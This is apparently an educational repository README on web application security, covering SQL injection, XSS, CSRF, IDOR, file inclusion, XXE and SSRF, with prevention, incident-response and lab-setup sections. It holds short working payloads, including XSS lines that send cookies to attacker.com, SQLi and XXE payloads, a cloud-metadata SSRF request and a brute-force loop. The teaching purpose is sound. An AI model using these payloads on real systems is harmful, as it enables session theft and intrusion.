# 🌐 Web Attacks - Web Application Security Research

<div align="center">

**Educational materials for understanding web application vulnerabilities and attack techniques**

</div>

---

## 📚 Table of Contents

- [Overview](#overview)
- [Web Security Fundamentals](#web-security-fundamentals)
- [Common Vulnerabilities](#common-vulnerabilities)
- [Attack Techniques](#attack-techniques)
- [Detection & Prevention](#detection--prevention)
- [Removal & Recovery](#removal--recovery)
- [Lab Setup](#lab-setup)
- [Resources](#resources)

---

## Overview

This directory contains educational materials demonstrating various web application security vulnerabilities and attack techniques. These materials are designed to help you:

- Understand common web application vulnerabilities
- Learn how web attacks are executed
- Develop skills in web application security testing
- Improve your defensive security knowledge through understanding attack vectors

---

## Web Security Fundamentals

### HTTP Basics

#### Request Structure

```http
GET /login.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: sessionid=abc123
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret
```

#### Response Structure

```http
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=xyz789; HttpOnly; Secure

<html><body>Welcome!</body></html>
```

### Common Web Technologies

- **Frontend:** HTML, CSS, JavaScript, React, Angular, Vue
- **Backend:** PHP, Python, Ruby, Java, Node.js, Go
- **Databases:** MySQL, PostgreSQL, MongoDB, Redis
- **Servers:** Apache, Nginx, IIS, Tomcat

### Security Headers

```http
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
```

---

## Common Vulnerabilities

### 1. SQL Injection (SQLi)

**Description:** Injecting malicious SQL queries through user input

**Impact:** Data theft, data modification, authentication bypass, server compromise

**Types:**
- **In-band:** Error-based, Union-based
- **Blind:** Boolean-based, Time-based
- **Out-of-band:** DNS, HTTP

**Example:**
```sql
-- Vulnerable query
SELECT * FROM users WHERE username = '$username' AND password = '$password'

-- Malicious input
username: admin' OR '1'='1
-- Resulting query
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''
```

### 2. Cross-Site Scripting (XSS)

**Description:** Injecting malicious scripts into web pages

**Impact:** Session hijacking, phishing, malware distribution, defacement

**Types:**
- **Stored XSS:** Malicious script stored on server
- **Reflected XSS:** Malicious script reflected in response
- **DOM-based XSS:** Vulnerability in client-side code

**Example:**
```html
<!-- Vulnerable -->
<div>Hello, <%= user_input %></div>

<!-- Malicious input -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### 3. Cross-Site Request Forgery (CSRF)

**Description:** Tricking users into executing unwanted actions

**Impact:** Unwanted actions, data modification, account takeover

**Example:**
```html
<!-- Malicious page -->
<img src="http://bank.com/transfer?to=attacker&amount=1000">
```

### 4. Authentication & Session Management

**Vulnerabilities:**
- Weak password policies
- Session fixation
- Session hijacking
- Missing authentication
- Credential stuffing

**Example:**
```http
-- Weak session ID
Cookie: sessionid=12345  -- Predictable

-- Session fixation
Set-Cookie: sessionid=attacker_controlled
```

### 5. Insecure Direct Object References (IDOR)

**Description:** Accessing objects directly by ID without authorization

**Impact:** Unauthorized data access, data modification

**Example:**
```http
-- Vulnerable
GET /account/12345/details  -- Access any account by changing ID

-- Attack
GET /account/99999/details  -- Access another user's account
```

### 6. File Inclusion

**Types:**
- **Local File Inclusion (LFI):** Including local files
- **Remote File Inclusion (RFI):** Including remote files

**Example:**
```php
// Vulnerable
$page = $_GET['page'];
include($page . '.php');

// Attack
?page=../../../../etc/passwd
?page=http://attacker.com/malicious
```

### 7. XML External Entity (XXE)

**Description:** Exploiting XML processors with external entities

**Impact:** File disclosure, SSRF, DoS

**Example:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

### 8. Server-Side Request Forgery (SSRF)

**Description:** Forcing server to make requests to internal resources

**Impact:** Internal network access, data exfiltration, cloud metadata access

**Example:**
```http
-- Vulnerable
GET /fetch?url=http://internal-admin/dashboard

-- Attack
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```

---

## Attack Techniques

### SQL Injection Techniques

#### Union-Based Injection

```sql
' UNION SELECT 1, username, password FROM users--
```

#### Error-Based Injection

```sql
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users))--
```

#### Boolean-Based Blind Injection

```sql
' AND 1=1--  -- Returns true
' AND 1=2--  -- Returns false
```

#### Time-Based Blind Injection

```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### XSS Techniques

#### Stored XSS

```html
<!-- Comment field -->
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
```

#### Reflected XSS

```html
<!-- Search parameter -->
<script>alert(document.cookie)</script>
```

#### DOM-Based XSS

```javascript
// Vulnerable code
var name = document.location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Hello " + name;

// Attack
#<img src=x onerror=alert(1)>
```

### CSRF Techniques

#### Simple Image CSRF

```html
<img src="http://target.com/change-password?new=attacker123">
```

#### Form Auto-Submit CSRF

```html
<form action="http://target.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

### Authentication Attacks

#### Brute Force

```python
import requests

for password in passwords:
    r = requests.post('/login', data={'user': 'admin', 'pass': password})
    if 'success' in r.text:
        print(f"Found: {password}")
        break
```

#### Session Fixation

```http
-- Attacker gets session
GET /login  -> Set-Cookie: sessionid=abc123

-- Victim logs in with same session
POST /login?sessionid=abc123
-- Attacker now has authenticated session
```

---

## Detection & Prevention

### SQL Injection Prevention

#### Parameterized Queries

```python
# Vulnerable
cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")

# Secure
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

#### Input Validation

```python
import re

if not re.match(r'^[a-zA-Z0-9_]+$', username):
    raise ValueError("Invalid username")
```

#### Least Privilege

```sql
-- Application user with limited permissions
GRANT SELECT, INSERT on app_database to 'app_user'@'localhost';
```

### XSS Prevention

#### Output Encoding

```html
<!-- HTML encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- JavaScript encoding -->
\u003Cscript\u003Ealert(1)\u003C/script\u003E
```

#### Content Security Policy

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
```

#### Input Sanitization

```python
import bleach

clean = bleach.clean(user_input, tags=[], attributes={})
```

### CSRF Prevention

#### CSRF Tokens

```html
<form method="POST">
  <input type="hidden" name="csrf_token" value="abc123...">
  <!-- other fields -->
</form>
```

#### SameSite Cookies

```http
Set-Cookie: sessionid=xyz; SameSite=Strict
```

#### Origin/Referrer Checking

```python
if request.headers.get('Origin') != 'https://trusted-site.com':
    abort(403)
```

### Authentication Security

#### Strong Password Policies

- Minimum length (12+ characters)
- Complexity requirements
- Password hashing (bcrypt, Argon2)
- Password rotation policies

#### Multi-Factor Authentication

```python
# Pseudocode
if not verify_password(username, password):
    return False
if not verify_2fa(username, code):
    return False
return True
```

#### Secure Session Management

```http
Set-Cookie: sessionid=xyz; HttpOnly; Secure; SameSite=Strict
```

---

## Removal & Recovery

### Incident Response for Web Attacks

#### 1. Immediate Containment

**Take Application Offline:**
- Disable web server if attack is active
- Put application in maintenance mode
- Block access to vulnerable endpoints
- Implement IP blocks if attack is from specific sources

**Preserve Evidence:**
- Capture web server logs
- Save database state
- Document attack vectors
- Preserve attacker's session data

#### 2. Vulnerability Assessment

**Identify the Attack Type:**
- Review access logs for suspicious patterns
- Check for SQL injection attempts
- Look for XSS payloads in requests
- Monitor for authentication bypass attempts

**Determine Impact:**
- Check for data exfiltration
- Verify database integrity
- Review user account changes
- Check for unauthorized file uploads

#### 3. Database Recovery

**SQL Injection Recovery:**
```sql
-- Check for data modification
SELECT * FROM users WHERE created_at > 'attack_time';

-- Restore from backup
-- Use point-in-time recovery if available
-- Verify data integrity
```

**Verify Data Integrity:**
- Check for unauthorized record changes
- Review user account modifications
- Verify sensitive data exposure
- Audit admin account activities

#### 4. Application Patching

**Apply Security Patches:**
- Update web application framework
- Apply security patches to dependencies
- Review and fix vulnerable code
- Test patches in staging environment

**Code Review:**
- Audit input validation
- Review authentication logic
- Check session management
- Verify authorization controls

#### 5. Credential Rotation

**Change All Passwords:**
- User account passwords
- Admin credentials
- Database passwords
- API keys and tokens
- Session secrets

**Review Sessions:**
- Invalidate all active sessions
- Force password reset for all users
- Review session management code
- Implement secure session handling

### Post-Incident Actions

1. **Conduct Security Audit** - Full application security review
2. **Implement WAF** - Web Application Firewall for protection
3. **Enhance Logging** - Improve monitoring and alerting
4. **Train Developers** - Secure coding practices
5. **Document Incident** - Create incident report
6. **Update Policies** - Implement lessons learned

### Prevention Strategies

#### Secure Coding Practices

**Input Validation:**
- Validate all user input on server-side
- Use parameterized queries for database access
- Implement output encoding
- Use allow-lists instead of block-lists

**Authentication & Authorization:**
- Implement strong password policies
- Use multi-factor authentication
- Implement proper session management
- Use role-based access control

**Security Headers:**
```http
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
```

#### Application Hardening

**Web Server Configuration:**
- Disable unnecessary modules
- Implement HTTPS everywhere
- Use secure cipher suites
- Disable directory listing

**Database Security:**
- Use least privilege for database users
- Encrypt sensitive data at rest
- Implement database auditing
- Regular database backups

**Dependency Management:**
- Keep dependencies updated
- Use dependency scanning tools
- Review security advisories
- Remove unused dependencies

---

## Lab Setup

### Local Testing Environment

#### DVWA (Damn Vulnerable Web Application)

```bash
# Using Docker
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Access at http://localhost
# Default credentials: admin / password
```

#### OWASP Juice Shop

```bash
# Using Docker
docker run --rm -it -p 3000:3000 bkimminich/juice-shop

# Access at http://localhost:3000
```

#### WebGoat

```bash
# Using Docker
docker run --rm -it -p 8080:8080 webgoat/webgoat

# Access at http://localhost:8080/WebGoat
```

### Browser Setup

#### Security Testing Tools

- **Burp Suite:** Web application security testing
- **OWASP ZAP:** Free security scanner
- **Browser Extensions:**
  - FoxyProxy (Proxy management)
  - EditThisCookie (Cookie editing)
  - HackBar (Request manipulation)

#### Configuration

1. **Configure Proxy**
   - Set browser proxy to 127.0.0.1:8080
   - Install Burp Suite CA certificate
   - Enable SSL interception

2. **Disable Security Features (for testing only)**
   - Disable XSS filter
   - Disable same-origin policy (in testing profile)
   - Enable mixed content

### Network Setup

#### Isolated Testing Network

- Use virtual machine for testing
- Host-only network adapter
- Disable internet access
- Use internal DNS for testing domains

---

## Resources

### Learning Platforms

- **OWASP Web Security Academy:** [Free Interactive Labs](https://portswigger.net/web-security)
- **HackTheBox:** [Web Challenges](https://hackthebox.com/)
- **TryHackMe:** [Web Paths](https://tryhackme.com/paths/web)
- **PentesterLab:** [Web Courses](https://www.pentesterlab.com/)

### Tools

- **Proxy & Interception:**
  - [Burp Suite](https://portswigger.net/burp)
  - [OWASP ZAP](https://www.zaproxy.org/)
  - [Fiddler](https://www.telerik.com/fiddler)

- **Scanning:**
  - [Nikto](https://github.com/sullo/nikto)
  - [SQLMap](http://sqlmap.org/)
  - [Nmap](https://nmap.org/)

- **Exploitation:**
  - [Metasploit Framework](https://www.metasploit.com/)
  - [BeEF](http://beefproject.com/)
  - [XSStrike](https://github.com/s0md3v/XSStrike)

- **Fuzzing:**
  - [WFuzz](https://github.com/xmendez/wfuzz)
  - [FFUF](https://github.com/ffuf/ffuf)
  - [DirBuster](https://sourceforge.net/projects/dirbuster/)

### Reference Materials

- **OWASP Top 10:** [Most Critical Web Risks](https://owasp.org/www-project-top-ten/)
- **OWASP Testing Guide:** [Web Application Testing](https://owasp.org/www-project-web-security-testing-guide/)
- **Web Application Hacker's Handbook:** Dafydd Stuttard, Marcus Pinto
- **The Tangled Web:** Michal Zalewski

### Standards & Best Practices

- **OWASP ASVS:** [Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/)
- **CIS Benchmarks:** [Security Configuration Guides](https://www.cisecurity.org/cis-benchmarks)
- **NIST Guidelines:** [Security Standards](https://csrc.nist.gov/)

---

## ⚠️ Important Notes

- All materials in this directory are for **educational purposes only**
- Never attack web applications you don't own or have permission to test
- Unauthorized web attacks are illegal and unethical
- Always follow responsible disclosure practices
- Use isolated lab environments for testing
- Refer to the main [DISCLAIMER.md](../DISCLAIMER.md) for full legal information

---

<div align="center">

**🔒 Understanding web attacks is essential for building secure applications**

**📧 Questions? Open an issue in the main repository**

</div>
